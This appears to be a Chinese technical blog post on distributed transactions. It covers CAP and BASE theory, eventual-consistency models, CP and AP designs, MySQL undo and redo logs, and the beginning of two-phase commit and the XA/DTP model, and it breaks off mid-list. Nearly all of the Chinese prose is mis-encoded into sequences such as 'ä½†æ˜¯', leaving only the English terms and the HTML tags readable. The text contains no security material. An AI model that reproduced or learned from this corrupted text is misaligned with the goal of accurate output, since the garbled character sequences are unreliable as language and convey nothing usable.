<p>ä½†æ˜¯å½“æˆ‘ä»¬æŠŠä¸‰ä»¶äº‹æƒ…çœ‹åšä¸€ä¸ªäº‹æƒ…äº‹ï¼Œè¦æ»¡è¶³ä¿è¯â€œä¸šåŠ¡â€çš„åŸå­æ€§ï¼Œè¦ä¹ˆæ‰€æœ‰æ“ä½œå…¨éƒ¨æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥ï¼Œä¸å…è®¸å‡ºç°éƒ¨åˆ†æˆåŠŸéƒ¨åˆ†å¤±è´¥çš„ç°è±¡ï¼Œè¿™å°±æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿä¸‹çš„äº‹åŠ¡äº†ã€‚</p>
<p>æ­¤æ—¶ACIDéš¾ä»¥æ»¡è¶³ï¼Œè¿™æ˜¯åˆ†å¸ƒå¼äº‹åŠ¡è¦è§£å†³çš„é—®é¢˜</p>
<h2 id="è§£å†³åˆ†å¸ƒå¼äº‹åŠ¡çš„æ€è·¯"><a href="#è§£å†³åˆ†å¸ƒå¼äº‹åŠ¡çš„æ€è·¯" class="headerlink" title="è§£å†³åˆ†å¸ƒå¼äº‹åŠ¡çš„æ€è·¯"></a>è§£å†³åˆ†å¸ƒå¼äº‹åŠ¡çš„æ€è·¯</h2><h3 id="CAPå®šç†"><a href="#CAPå®šç†" class="headerlink" title="CAPå®šç†"></a>CAPå®šç†</h3><p>Consistency(ä¸€è‡´æ€§), Availability(å¯ç”¨æ€§), Partition Tolerance(åˆ†åŒºå®¹é”™æ€§); è¿™ä¸ªä¸‰ä¸ªæŒ‡æ ‡ä¸å¯èƒ½åŒæ—¶å®Œæˆ, è¿™ä¸ªç»“è®ºå°±å«åšCAPå®šç†;</p>
<p>èˆå¼ƒå®¹é”™æ€§ã€‚ä½†æ˜¯è¿™ä¹Ÿå°±æ„å‘³ç€ä½ çš„ç³»ç»Ÿä¸æ˜¯åˆ†å¸ƒå¼çš„äº†ï¼Œå› ä¸ºæ¶‰åŠåˆ†å¸ƒå¼çš„æƒ³æ³•å°±æ˜¯æŠŠåŠŸèƒ½åˆ†å¼€ï¼Œéƒ¨ç½²åˆ°ä¸åŒçš„æœºå™¨ä¸Šã€‚</p>
<h3 id="Baseç†è®º"><a href="#Baseç†è®º" class="headerlink" title="Baseç†è®º"></a>Baseç†è®º</h3><p>Basically Available(åŸºæœ¬å¯ç”¨), Soft state(è½¯çŠ¶æ€), Eventually consistent(æœ€ç»ˆä¸€è‡´æ€§)</p>
<h4 id="åŸºæœ¬å¯ç”¨"><a href="#åŸºæœ¬å¯ç”¨" class="headerlink" title="åŸºæœ¬å¯ç”¨"></a>åŸºæœ¬å¯ç”¨</h4><p><strong>å“åº”æ—¶é—´ä¸Šçš„æŸå¤±</strong>ï¼šæ­£å¸¸æƒ…å†µä¸‹çš„æœç´¢å¼•æ“0.5ç§’å³è¿”å›ç»™ç”¨æˆ·ç»“æœï¼Œè€ŒåŸºæœ¬å¯ç”¨çš„æœç´¢å¼•æ“å¯ä»¥åœ¨2ç§’ä½œç”¨è¿”å›ç»“æœã€‚</p>
<p><strong>åŠŸèƒ½ä¸Šçš„æŸå¤±</strong>ï¼šåœ¨ä¸€ä¸ªç”µå•†ç½‘ç«™ä¸Šï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥é¡ºåˆ©å®Œæˆæ¯ä¸€ç¬”è®¢å•ã€‚ä½†æ˜¯åˆ°äº†å¤§ä¿ƒæœŸé—´ï¼Œä¸ºäº†ä¿æŠ¤è´­ç‰©ç³»ç»Ÿçš„ç¨³å®šæ€§ï¼Œéƒ¨åˆ†æ¶ˆè´¹è€…å¯èƒ½ä¼šè¢«å¼•å¯¼åˆ°ä¸€ä¸ªé™çº§é¡µé¢ã€‚</p>
<h4 id="è½¯çŠ¶æ€"><a href="#è½¯çŠ¶æ€" class="headerlink" title="è½¯çŠ¶æ€"></a>è½¯çŠ¶æ€</h4><p>ä»€ä¹ˆæ˜¯è½¯çŠ¶æ€å‘¢ï¼Ÿç›¸å¯¹äºåŸå­æ€§è€Œè¨€ï¼Œè¦æ±‚å¤šä¸ªèŠ‚ç‚¹çš„æ•°æ®å‰¯æœ¬éƒ½æ˜¯ä¸€è‡´çš„ï¼Œè¿™æ˜¯ä¸€ç§â€œç¡¬çŠ¶æ€â€ã€‚</p>
<p>è½¯çŠ¶æ€æŒ‡çš„æ˜¯ï¼šå…è®¸ç³»ç»Ÿä¸­çš„æ•°æ®å­˜åœ¨ä¸­é—´çŠ¶æ€ï¼Œå¹¶è®¤ä¸ºè¯¥çŠ¶æ€ä¸å½±å“ç³»ç»Ÿçš„æ•´ä½“å¯ç”¨æ€§ï¼Œå³å…è®¸ç³»ç»Ÿåœ¨å¤šä¸ªä¸åŒèŠ‚ç‚¹çš„æ•°æ®å‰¯æœ¬å­˜åœ¨æ•°æ®å»¶æ—¶ã€‚</p>
<h4 id="æœ€ç»ˆä¸€è‡´æ€§"><a href="#æœ€ç»ˆä¸€è‡´æ€§" class="headerlink" title="æœ€ç»ˆä¸€è‡´æ€§"></a>æœ€ç»ˆä¸€è‡´æ€§</h4><p>ä¸Šé¢è¯´è½¯çŠ¶æ€ï¼Œç„¶åä¸å¯èƒ½ä¸€ç›´æ˜¯è½¯çŠ¶æ€ï¼Œå¿…é¡»æœ‰ä¸ªæ—¶é—´æœŸé™ã€‚åœ¨æœŸé™è¿‡åï¼Œåº”å½“ä¿è¯æ‰€æœ‰å‰¯æœ¬ä¿æŒæ•°æ®ä¸€è‡´æ€§ï¼Œä»è€Œè¾¾åˆ°æ•°æ®çš„æœ€ç»ˆä¸€è‡´æ€§ã€‚è¿™ä¸ªæ—¶é—´æœŸé™å–å†³äºç½‘ç»œå»¶æ—¶ã€ç³»ç»Ÿè´Ÿè½½ã€æ•°æ®å¤åˆ¶æ–¹æ¡ˆè®¾è®¡ç­‰ç­‰å› ç´ ã€‚</p>
<p>è€Œåœ¨å®é™…å·¥ç¨‹å®è·µä¸­ï¼Œæœ€ç»ˆä¸€è‡´æ€§åˆ†ä¸º5ç§ï¼š</p>
<p>å› æœä¸€è‡´æ€§ï¼ˆCausal consistencyï¼‰</p>
<p>å› æœä¸€è‡´æ€§æŒ‡çš„æ˜¯ï¼šå¦‚æœèŠ‚ç‚¹Aåœ¨æ›´æ–°å®ŒæŸä¸ªæ•°æ®åé€šçŸ¥äº†èŠ‚ç‚¹Bï¼Œé‚£ä¹ˆèŠ‚ç‚¹Bä¹‹åå¯¹è¯¥æ•°æ®çš„è®¿é—®å’Œä¿®æ”¹éƒ½æ˜¯åŸºäºAæ›´æ–°åçš„å€¼ã€‚äºæ­¤åŒæ—¶ï¼Œå’ŒèŠ‚ç‚¹Aæ— å› æœå…³ç³»çš„èŠ‚ç‚¹Cçš„æ•°æ®è®¿é—®åˆ™æ²¡æœ‰è¿™æ ·çš„é™åˆ¶ã€‚</p>
<p>è¯»å·±ä¹‹æ‰€å†™ï¼ˆRead your writesï¼‰</p>
<p>è¯»å·±ä¹‹æ‰€å†™æŒ‡çš„æ˜¯ï¼šèŠ‚ç‚¹Aæ›´æ–°ä¸€ä¸ªæ•°æ®åï¼Œå®ƒè‡ªèº«æ€»æ˜¯èƒ½è®¿é—®åˆ°è‡ªèº«æ›´æ–°è¿‡çš„æœ€æ–°å€¼ï¼Œè€Œä¸ä¼šçœ‹åˆ°æ—§å€¼ã€‚å…¶å®ä¹Ÿç®—ä¸€ç§å› æœä¸€è‡´æ€§ã€‚</p>
<p>ä¼šè¯ä¸€è‡´æ€§ï¼ˆSession consistencyï¼‰</p>
<p>ä¼šè¯ä¸€è‡´æ€§å°†å¯¹ç³»ç»Ÿæ•°æ®çš„è®¿é—®è¿‡ç¨‹æ¡†å®šåœ¨äº†ä¸€ä¸ªä¼šè¯å½“ä¸­ï¼šç³»ç»Ÿèƒ½ä¿è¯åœ¨åŒä¸€ä¸ªæœ‰æ•ˆçš„ä¼šè¯ä¸­å®ç° â€œè¯»å·±ä¹‹æ‰€å†™â€ çš„ä¸€è‡´æ€§ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰§è¡Œæ›´æ–°æ“ä½œä¹‹åï¼Œå®¢æˆ·ç«¯èƒ½å¤Ÿåœ¨åŒä¸€ä¸ªä¼šè¯ä¸­å§‹ç»ˆè¯»å–åˆ°è¯¥æ•°æ®é¡¹çš„æœ€æ–°å€¼ã€‚</p>
<p>å•è°ƒè¯»ä¸€è‡´æ€§ï¼ˆMonotonic read consistencyï¼‰</p>
<p>å•è°ƒè¯»ä¸€è‡´æ€§æŒ‡çš„æ˜¯ï¼šå¦‚æœä¸€ä¸ªèŠ‚ç‚¹ä»ç³»ç»Ÿä¸­è¯»å–å‡ºä¸€ä¸ªæ•°æ®é¡¹çš„æŸä¸ªå€¼åï¼Œé‚£ä¹ˆç³»ç»Ÿå¯¹äºè¯¥èŠ‚ç‚¹åç»­çš„ä»»ä½•æ•°æ®è®¿é—®éƒ½ä¸åº”è¯¥è¿”å›æ›´æ—§çš„å€¼ã€‚</p>
<p>å•è°ƒå†™ä¸€è‡´æ€§ï¼ˆMonotonic write consistencyï¼‰</p>
<p>å•è°ƒå†™ä¸€è‡´æ€§æŒ‡çš„æ˜¯ï¼šä¸€ä¸ªç³»ç»Ÿè¦èƒ½å¤Ÿä¿è¯æ¥è‡ªåŒä¸€ä¸ªèŠ‚ç‚¹çš„å†™æ“ä½œè¢«é¡ºåºçš„æ‰§è¡Œã€‚</p>
<p>åœ¨å®é™…çš„å®è·µä¸­ï¼Œè¿™5ç§ç³»ç»Ÿå¾€å¾€ä¼šç»“åˆä½¿ç”¨ï¼Œä»¥æ„å»ºä¸€ä¸ªå…·æœ‰æœ€ç»ˆä¸€è‡´æ€§çš„åˆ†å¸ƒå¼ç³»ç»Ÿã€‚</p>
<p>å®é™…ä¸Šï¼Œä¸åªæ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿä½¿ç”¨æœ€ç»ˆä¸€è‡´æ€§ï¼Œå…³ç³»å‹æ•°æ®åº“åœ¨æŸä¸ªåŠŸèƒ½ä¸Šï¼Œä¹Ÿæ˜¯ä½¿ç”¨æœ€ç»ˆä¸€è‡´æ€§çš„ã€‚æ¯”å¦‚å¤‡ä»½ï¼Œæ•°æ®åº“çš„å¤åˆ¶è¿‡ç¨‹æ˜¯éœ€è¦æ—¶é—´çš„ï¼Œè¿™ä¸ªå¤åˆ¶è¿‡ç¨‹ä¸­ï¼Œä¸šåŠ¡è¯»å–åˆ°çš„å€¼å°±æ˜¯æ—§çš„ã€‚å½“ç„¶ï¼Œæœ€ç»ˆè¿˜æ˜¯è¾¾æˆäº†æ•°æ®ä¸€è‡´æ€§ã€‚è¿™ä¹Ÿç®—æ˜¯ä¸€ä¸ªæœ€ç»ˆä¸€è‡´æ€§çš„ç»å…¸æ¡ˆä¾‹ã€‚</p>
<p>å°ç»“</p>
<p>æ€»ä½“æ¥è¯´BASEç†è®ºé¢å‘çš„æ˜¯å¤§å‹é«˜å¯ç”¨ã€å¯æ‰©å±•çš„åˆ†å¸ƒå¼ç³»ç»Ÿã€‚ä¸ä¼ ç»ŸACIDç‰¹æ€§ç›¸åï¼Œä¸åŒäºACIDçš„å¼ºä¸€è‡´æ€§æ¨¡å‹ï¼ŒBASEæå‡ºé€šè¿‡ç‰ºç‰²å¼ºä¸€è‡´æ€§æ¥è·å¾—å¯ç”¨æ€§ï¼Œå¹¶å…è®¸æ•°æ®æ®µæ—¶é—´å†…çš„ä¸ä¸€è‡´ï¼Œä½†æ˜¯æœ€ç»ˆè¾¾åˆ°ä¸€è‡´çŠ¶æ€ã€‚åŒæ—¶ï¼Œåœ¨å®é™…åˆ†å¸ƒå¼åœºæ™¯ä¸­ï¼Œä¸åŒä¸šåŠ¡å¯¹æ•°æ®çš„ä¸€è‡´æ€§è¦æ±‚ä¸ä¸€æ ·ã€‚å› æ­¤åœ¨è®¾è®¡ä¸­ï¼ŒACIDå’ŒBASEç†è®ºå¾€å¾€åˆä¼šç»“åˆä½¿ç”¨ã€‚</p>
<p>è€Œæˆ‘ä»¬è§£å†³åˆ†å¸ƒå¼äº‹åŠ¡ï¼Œå°±æ˜¯æ ¹æ®Baseç†è®ºå’ŒCAPç†è®ºæ¥å®ç°ã€‚</p>
<p>è¿˜ä»¥ä¸Šé¢çš„ä¸‹å•å‡åº“å­˜å’Œæ‰£æ¬¾ä¸ºä¾‹ï¼š</p>
<p>è®¢å•æœåŠ¡ã€åº“å­˜æœåŠ¡ã€ç”¨æˆ·æœåŠ¡åŠä»–ä»¬å¯¹åº”çš„æ•°æ®åº“å°±æ˜¯åˆ†å¸ƒå¼åº”ç”¨ä¸­çš„ä¸‰ä¸ªéƒ¨åˆ†ã€‚</p>
<ul>
<li><p>CPæ–¹å¼ï¼šç°åœ¨å¦‚æœè¦æ»¡è¶³äº‹åŠ¡çš„å¼ºä¸€è‡´æ€§ï¼Œå°±å¿…é¡»åœ¨è®¢å•æœåŠ¡æ•°æ®åº“é”å®šçš„åŒæ—¶ï¼Œå¯¹åº“å­˜æœåŠ¡ã€ç”¨æˆ·æœåŠ¡æ•°æ®èµ„æºåŒæ—¶é”å®šã€‚ç­‰å¾…ä¸‰ä¸ªæœåŠ¡ä¸šåŠ¡å…¨éƒ¨å¤„ç†å®Œæˆï¼Œæ‰å¯ä»¥é‡Šæ”¾èµ„æºã€‚æ­¤æ—¶å¦‚æœæœ‰å…¶ä»–è¯·æ±‚æƒ³è¦æ“ä½œè¢«é”å®šçš„èµ„æºå°±ä¼šè¢«é˜»å¡ï¼Œè¿™æ ·å°±æ˜¯æ»¡è¶³äº†CPã€‚</p>
<p>è¿™å°±æ˜¯å¼ºä¸€è‡´ï¼Œå¼±å¯ç”¨</p>
</li>
<li><p>APæ–¹å¼ï¼šä¸‰ä¸ªæœåŠ¡çš„å¯¹åº”æ•°æ®åº“å„è‡ªç‹¬ç«‹æ‰§è¡Œè‡ªå·±çš„ä¸šåŠ¡ï¼Œæ‰§è¡Œæœ¬åœ°äº‹åŠ¡ï¼Œä¸è¦æ±‚äº’ç›¸é”å®šèµ„æºã€‚ä½†æ˜¯è¿™ä¸ªä¸­é—´çŠ¶æ€ä¸‹ï¼Œæˆ‘ä»¬å»è®¿é—®æ•°æ®åº“ï¼Œå¯èƒ½é‡åˆ°æ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µï¼Œä¸è¿‡æˆ‘ä»¬éœ€è¦åšä¸€äº›åè¡¥æªæ–½ï¼Œä¿è¯åœ¨ç»è¿‡ä¸€æ®µæ—¶é—´åï¼Œæ•°æ®æœ€ç»ˆæ»¡è¶³ä¸€è‡´æ€§ã€‚</p>
<p>è¿™å°±æ˜¯é«˜å¯ç”¨ï¼Œä½†å¼±ä¸€è‡´ï¼ˆæœ€ç»ˆä¸€è‡´ï¼‰ã€‚</p>
</li>
</ul>
<p>ç”±ä¸Šé¢çš„ä¸¤ç§æ€æƒ³ï¼Œå»¶ä¼¸å‡ºäº†å¾ˆå¤šçš„åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆï¼š</p>
<ul>
<li>XA</li>
<li>TCC</li>
<li>å¯é æ¶ˆæ¯æœ€ç»ˆä¸€è‡´</li>
<li>TA</li>
</ul>
<p>ä¸è¿‡ï¼Œè¦æƒ³ææ‡‚è¿™äº›åŸç†ï¼Œä½ å¿…é¡»çŸ¥é“æ•°æ®åº“æœ¬åœ°äº‹åŠ¡æ˜¯å¦‚ä½•å®ç°çš„ï¼Œä¹Ÿå°±æ˜¯undoå’Œredoæ—¥å¿—çš„æ•…äº‹ã€‚</p>
<h3 id="undoå’Œredo"><a href="#undoå’Œredo" class="headerlink" title="undoå’Œredo"></a>undoå’Œredo</h3><p>åœ¨æ•°æ®åº“ç³»ç»Ÿä¸­ï¼Œæ—¢æœ‰å­˜æ”¾æ•°æ®çš„æ–‡ä»¶ï¼Œä¹Ÿæœ‰å­˜æ”¾æ—¥å¿—çš„æ–‡ä»¶ã€‚æ—¥å¿—åœ¨å†…å­˜ä¸­ä¹Ÿæ˜¯æœ‰ç¼“å­˜Log bufferï¼Œä¹Ÿæœ‰ç£ç›˜æ–‡ä»¶log fileã€‚MySQLä¸­çš„æ—¥å¿—æ–‡ä»¶ï¼Œæœ‰è¿™ä¹ˆä¸¤ç±»ä¸äº‹åŠ¡æœ‰å…³ï¼šundoæ—¥å¿—ä¸redoæ—¥å¿—ã€‚</p>
<h4 id="undo-log"><a href="#undo-log" class="headerlink" title="undo log"></a>undo log</h4><p>æŒä¹…æ€§å’ŒåŸå­æ€§å¯ä»¥åˆ©ç”¨undo logæ¥å®ç°</p>
<p>åŸç†: ä¸ºäº†æ»¡è¶³äº‹åŠ¡çš„åŸå­æ€§,åœ¨æ“ä½œä»»ä½•æ•°æ®ä¹‹å‰,é¦–å…ˆå°†æ•°æ®å¤‡ä»½åˆ°undo log. ç„¶åè¿›è¡Œæ•°æ®çš„ä¿®æ”¹. å¦‚æœå‡ºç°äº†é”™è¯¯æˆ–è€…ç”¨æˆ·æ‰§è¡Œäº†ROLLBACKè¯­å¥,ç³»ç»Ÿå¯ä»¥åˆ©ç”¨Undo log ä¸­çš„å¤‡ä»½æ•°æ®å°†æ•°æ®æ¢å¤åˆ°äº‹åŠ¡å¼€å§‹ä¹‹å‰çš„çŠ¶æ€.</p>
<p>æ•°æ®åº“å†™å…¥æ•°æ®åˆ°ç£ç›˜ä¹‹å‰, ä¼šæŠŠæ•°æ®å…ˆç¼“å­˜åœ¨å†…å­˜ä¸­,äº‹åŠ¡æäº¤æ—¶æ‰ä¼šå†™å…¥ç£ç›˜ä¸­.</p>
<p>ç”¨undo log å®ç°åŸå­æ€§å’ŒæŒä¹…æ€§çš„äº‹åŠ¡çš„ç®€åŒ–è¿‡ç¨‹: </p>
<p>å‡è®¾æœ‰Aã€Bä¸¤ä¸ªæ•°æ®,å€¼åˆ†åˆ«ä¸º1,2</p>
<p> A. äº‹åŠ¡å¼€å§‹.<br> B. è®°å½•A&#x3D;1åˆ°undo log buffer.<br> C. ä¿®æ”¹A&#x3D;3.<br> D. è®°å½•B&#x3D;2åˆ°undo log buffer.<br> E. ä¿®æ”¹B&#x3D;4.<br> F. å°†undo log bufferå†™åˆ°ç£ç›˜ã€‚<br> G. å°†æ•°æ®å†™åˆ°ç£ç›˜ã€‚<br> H. äº‹åŠ¡æäº¤</p>
<ul>
<li><p>å¦‚ä½•ä¿è¯åŸå­æ€§ï¼Ÿ</p>
<p>åœ¨ä¿®æ”¹æ•°æ®åˆ°ç£ç›˜å‰ï¼Œä¼šå…ˆè®°å½•undo logï¼Œå¹¶å°†undo logæŒä¹…åŒ–åˆ°ç¡¬ç›˜</p>
</li>
<li><p>å¦‚ä½•ä¿è¯æŒä¹…æ€§ï¼Ÿ</p>
<p>åœ¨äº‹åŠ¡æäº¤ä¹‹å‰ï¼ŒæŠŠå†…å­˜ä¸­ç¼“å­˜çš„æ•°æ®å†™å…¥ç£ç›˜ã€‚è¿™æ ·äº‹åŠ¡æäº¤æ—¶ï¼Œå¯ä»¥ç¡®å®šæ•°æ®æ˜¯å·²ç»æŒä¹…åŒ–çš„ï¼Œä¸ä¼šä¸¢å¤±ã€‚</p>
</li>
<li><p>è‹¥ç³»ç»Ÿåœ¨Gå’ŒHä¹‹é—´å´©æºƒ</p>
<p>æ­¤æ—¶äº‹åŠ¡å¹¶æœªæäº¤ï¼Œéœ€è¦å›æ»šã€‚è€Œundo logå·²ç»è¢«æŒä¹…åŒ–ï¼Œå¯ä»¥æ ¹æ®undo logæ¥æ¢å¤æ•°æ®</p>
</li>
<li><p>è‹¥ç³»ç»Ÿåœ¨Gä¹‹å‰å´©æºƒ</p>
<p>æ­¤æ—¶æ•°æ®å¹¶æœªæŒä¹…åŒ–åˆ°ç¡¬ç›˜ï¼Œä¾ç„¶ä¿æŒåœ¨äº‹åŠ¡ä¹‹å‰çš„çŠ¶æ€</p>
</li>
</ul>
<p><strong>ç¼ºé™·ï¼š</strong>æ¯ä¸ªäº‹åŠ¡æäº¤å‰å°†æ•°æ®å’ŒUndo Logå†™å…¥ç£ç›˜ï¼Œè¿™æ ·ä¼šå¯¼è‡´å¤§é‡çš„ç£ç›˜IOï¼Œå› æ­¤æ€§èƒ½å¾ˆä½ã€‚</p>
<p>å¦‚æœèƒ½å¤Ÿå°†æ•°æ®ç¼“å­˜ä¸€æ®µæ—¶é—´ï¼Œå°±èƒ½å‡å°‘IOæé«˜æ€§èƒ½ã€‚ä½†æ˜¯è¿™æ ·å°±ä¼šä¸§å¤±äº‹åŠ¡çš„æŒä¹…æ€§ã€‚å› æ­¤å¼•å…¥äº†å¦å¤–ä¸€ç§æœºåˆ¶æ¥å®ç°æŒä¹…åŒ–ï¼Œå³<strong>Redo Log</strong>.</p>
<h4 id="redo-log"><a href="#redo-log" class="headerlink" title="redo log"></a>redo log</h4><p>å’ŒUndo Logç›¸åï¼ŒRedo Logè®°å½•çš„æ˜¯<strong>æ–°æ•°æ®</strong>çš„å¤‡ä»½ã€‚<strong>åœ¨äº‹åŠ¡æäº¤å‰ï¼Œåªè¦å°†Redo LogæŒä¹…åŒ–å³å¯ï¼Œä¸éœ€è¦å°†æ•°æ®æŒä¹…åŒ–ï¼Œå‡å°‘äº†IOçš„æ¬¡æ•°ã€‚</strong></p>
<p>å…ˆæ¥çœ‹ä¸‹åŸºæœ¬åŸç†ï¼š</p>
<blockquote>
<p><strong>Undo + Redoäº‹åŠ¡çš„ç®€åŒ–è¿‡ç¨‹</strong></p>
</blockquote>
<p> å‡è®¾æœ‰Aã€Bä¸¤ä¸ªæ•°æ®ï¼Œå€¼åˆ†åˆ«ä¸º1,2</p>
<p> A. äº‹åŠ¡å¼€å§‹.<br> B. è®°å½•A&#x3D;1åˆ°undo log.<br> C. ä¿®æ”¹A&#x3D;3.<br> D. è®°å½•A&#x3D;3åˆ°redo log.<br> E. è®°å½•B&#x3D;2åˆ°undo log.<br> F. ä¿®æ”¹B&#x3D;4.<br> G. è®°å½•B&#x3D;4åˆ°redo log.<br> H. å°†undo logå†™å…¥redo log<br> I. å°†redo logå†™å…¥ç£ç›˜<br> J. äº‹åŠ¡æäº¤</p>
<blockquote>
<p>å®‰å…¨å’Œæ€§èƒ½é—®é¢˜</p>
</blockquote>
<ul>
<li><p>å¦‚ä½•ä¿è¯åŸå­æ€§ï¼Ÿ</p>
<p>å¦‚æœåœ¨äº‹åŠ¡æäº¤å‰æ•…éšœï¼Œé€šè¿‡undo logæ—¥å¿—æ¢å¤æ•°æ®ã€‚å¦‚æœundo logéƒ½è¿˜æ²¡å†™å…¥ï¼Œé‚£ä¹ˆæ•°æ®å°±å°šæœªæŒä¹…åŒ–ï¼Œæ— éœ€å›æ»š</p>
</li>
<li><p>å¦‚ä½•ä¿è¯æŒä¹…åŒ–ï¼Ÿ</p>
<p>å¤§å®¶ä¼šå‘ç°ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰å‡ºç°æ•°æ®çš„æŒä¹…åŒ–ã€‚å› ä¸ºæ•°æ®å·²ç»å†™å…¥redo logï¼Œè€Œredo logæŒä¹…åŒ–åˆ°äº†ç¡¬ç›˜ï¼Œå› æ­¤åªè¦åˆ°äº†Iä»¥åï¼Œäº‹åŠ¡æ˜¯å¯ä»¥æäº¤çš„ã€‚</p>
</li>
<li><p>å†…å­˜ä¸­çš„æ•°æ®åº“æ•°æ®ä½•æ—¶æŒä¹…åŒ–åˆ°ç£ç›˜ï¼Ÿ</p>
<p>å› ä¸ºredo logå·²ç»æŒä¹…åŒ–ï¼Œå› æ­¤æ•°æ®åº“æ•°æ®å†™å…¥ç£ç›˜ä¸å¦å½±å“ä¸å¤§ï¼Œä¸è¿‡ä¸ºäº†é¿å…å‡ºç°è„æ•°æ®ï¼ˆå†…å­˜ä¸­ä¸ç£ç›˜ä¸ä¸€è‡´ï¼‰ï¼Œäº‹åŠ¡æäº¤åä¹Ÿä¼šå°†å†…å­˜æ•°æ®åˆ·å…¥ç£ç›˜ï¼ˆä¹Ÿå¯ä»¥æŒ‰ç…§å›ºè®¾å®šçš„é¢‘ç‡åˆ·æ–°å†…å­˜æ•°æ®åˆ°ç£ç›˜ä¸­ï¼‰ã€‚</p>
</li>
<li><p>æŒä¹…åŒ–redoå’ŒæŒä¹…åŒ–æ•°æ®åº“æ•°æ®æœ‰ä»€ä¹ˆæ€§èƒ½å·®å¼‚ï¼Ÿ</p>
<ul>
<li><p>æ•°æ®åº“æ•°æ®å†™å…¥æ˜¯éšæœºIOï¼Œæ€§èƒ½å¾ˆå·®</p>
</li>
<li><p>redo logåœ¨åˆå§‹åŒ–æ—¶ä¼šå¼€è¾Ÿä¸€æ®µè¿ç»­çš„ç©ºé—´ï¼Œå†™å…¥æ˜¯é¡ºåºIOï¼Œæ€§èƒ½å¾ˆå¥½</p>
</li>
</ul>
</li>
<li><p>redo logä¸­è®°å½•çš„æ•°æ®ï¼Œæœ‰å¯èƒ½å°šæœªæäº¤ï¼Œé‚£ä¹ˆå¦‚ä½•å®Œæˆæ•°æ®æ¢å¤ï¼Ÿ</p>
<p>æ•°æ®æ¢å¤æœ‰ä¸¤ç§ç­–ç•¥ï¼š</p>
<ul>
<li>æ¢å¤æ—¶ï¼Œåªé‡åšå·²ç»æäº¤äº†çš„äº‹åŠ¡</li>
<li>æ¢å¤æ—¶ï¼Œé‡åšæ‰€æœ‰äº‹åŠ¡åŒ…æ‹¬æœªæäº¤çš„äº‹åŠ¡å’Œå›æ»šäº†çš„äº‹åŠ¡ã€‚ç„¶åé€šè¿‡Undo Logå›æ»šé‚£äº›æœªæäº¤çš„äº‹åŠ¡</li>
</ul>
<p>Inodbå¼•æ“é‡‡ç”¨çš„æ˜¯ç¬¬äºŒç§æ–¹æ¡ˆï¼Œå› æ­¤undo logè¦åœ¨ redo logå‰æŒä¹…åŒ–</p>
</li>
<li><p>å†™å…¥æ€§èƒ½çš„ä¼˜åŒ–</p>
<p>äº‹åŠ¡æäº¤å‰éœ€è¦åŒæ—¶å†™å…¥undo logå’Œ redo logï¼ŒåŠ¿å¿…å¢åŠ IOæ¬¡æ•°ï¼Œå› æ­¤å®é™…ä¸Šundo logå¹¶ä¸æ˜¯ç›´æ¥å†™å…¥ç£ç›˜ï¼Œè€Œæ˜¯å…ˆå†™å…¥åˆ°redo logä¸­ï¼Œå½“redo logæŒä¹…åŒ–æ—¶ï¼Œundo logå°±åŒæ—¶æŒä¹…åŒ–åˆ°ç¡¬ç›˜äº†ã€‚</p>
<p>å› æ­¤äº‹åŠ¡æäº¤å‰ï¼Œåªéœ€è¦å¯¹redo logæŒä¹…åŒ–å³å¯ã€‚</p>
<p>å¦å¤–ï¼Œredo logå¹¶ä¸æ˜¯å†™å…¥ä¸€æ¬¡å°±æŒä¹…åŒ–ä¸€æ¬¡ï¼Œredo logåœ¨å†…å­˜ä¸­ä¹Ÿæœ‰è‡ªå·±çš„ç¼“å†²æ± ï¼š<code>redo log buffer</code>ã€‚æ¯æ¬¡å†™redo logéƒ½æ˜¯å†™å…¥åˆ°bufferï¼Œåœ¨æäº¤æ—¶ä¸€æ¬¡æ€§æŒä¹…åŒ–åˆ°ç£ç›˜ï¼Œå‡å°‘IOæ­¤æ—¶ã€‚</p>
</li>
</ul>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>æœ€åæ€»ç»“ä¸€ä¸‹ï¼š</p>
<ul>
<li>undo log è®°å½•æ›´æ–°å‰æ•°æ®ï¼Œç”¨äºä¿è¯äº‹åŠ¡åŸå­æ€§</li>
<li>redo log è®°å½•æ›´æ–°åæ•°æ®ï¼Œç”¨äºä¿è¯äº‹åŠ¡çš„æŒä¹…æ€§</li>
<li>redo logæœ‰è‡ªå·±çš„å†…å­˜bufferï¼Œå…ˆå†™å…¥åˆ°bufferï¼Œäº‹åŠ¡æäº¤æ—¶å†™å…¥ç£ç›˜</li>
<li>redo logæŒä¹…åŒ–ä¹‹åï¼Œæ„å‘³ç€äº‹åŠ¡æ˜¯<strong>å¯æäº¤</strong>çš„</li>
</ul>
<h3 id="åˆ†é˜¶æ®µæäº¤"><a href="#åˆ†é˜¶æ®µæäº¤" class="headerlink" title="åˆ†é˜¶æ®µæäº¤"></a>åˆ†é˜¶æ®µæäº¤</h3><h4 id="DTPå’ŒXA"><a href="#DTPå’ŒXA" class="headerlink" title="DTPå’ŒXA"></a>DTPå’ŒXA</h4><p>åˆ†å¸ƒå¼äº‹åŠ¡çš„è§£å†³æ‰‹æ®µä¹‹ä¸€ï¼Œå°±æ˜¯ä¸¤é˜¶æ®µæäº¤åè®®ï¼ˆ2PCï¼šTwo-Phase Commitï¼‰</p>
<p>é‚£ä¹ˆåˆ°åº•ä»€ä¹ˆæ˜¯ä¸¤é˜¶æ®µæäº¤åè®®å‘¢ï¼Ÿ</p>
<p>1994 å¹´ï¼ŒX&#x2F;Open ç»„ç»‡ï¼ˆå³ç°åœ¨çš„ Open Group ï¼‰å®šä¹‰äº†åˆ†å¸ƒå¼äº‹åŠ¡å¤„ç†çš„DTP æ¨¡å‹ã€‚è¯¥æ¨¡å‹åŒ…æ‹¬è¿™æ ·å‡ ä¸ªè§’è‰²ï¼š</p>
<ul>
<li>åº”ç”¨ç¨‹åºï¼ˆ AP,Application ï¼‰ï¼šæˆ‘ä»¬çš„å¾®æœåŠ¡</li>
<li>äº‹åŠ¡ç®¡ç†å™¨ï¼ˆ TM, Transction Managerï¼‰ï¼šå…¨å±€äº‹åŠ¡ç®¡ç†è€…</li>
